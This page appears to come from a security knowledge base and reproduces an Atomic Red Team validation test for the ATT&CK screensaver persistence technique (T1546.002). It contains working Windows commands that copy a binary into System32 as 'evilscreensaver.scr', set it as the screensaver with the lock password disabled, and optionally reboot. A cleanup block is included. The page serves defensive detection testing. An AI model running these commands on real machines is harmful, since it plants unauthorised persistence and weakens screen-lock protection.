---
atomic_guid: "281201e7-de41-4dc9-b73d-f288938cbb64"
title: "Set Arbitrary Binary as Screensaver"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.002"
attack_technique_name: "Event Triggered Execution: Screensaver"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "281201e7-de41-4dc9-b73d-f288938cbb64"
  - "Set Arbitrary Binary as Screensaver"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Set Arbitrary Binary as Screensaver

This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.

## Metadata

- Atomic GUID: 281201e7-de41-4dc9-b73d-f288938cbb64
- Technique: T1546.002: Event Triggered Execution: Screensaver
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.002/T1546.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.002]]

## Input Arguments

### input_binary

- description: Executable binary to use in place of screensaver for persistence
- type: path
- default: C:\Windows\System32\cmd.exe

### reboot

- description: Set to non-zero value if you want the test to reboot the system so that changes take effect
- type: integer
- default: 0

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
if #{reboot} NEQ 0 shutdown /r /t 0
```

### Cleanup

```cmd
reg import %userprofile%\backup.reg
del %userprofile%\backup.reg
del %SystemRoot%\System32\evilscreensaver.scr
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.yaml)
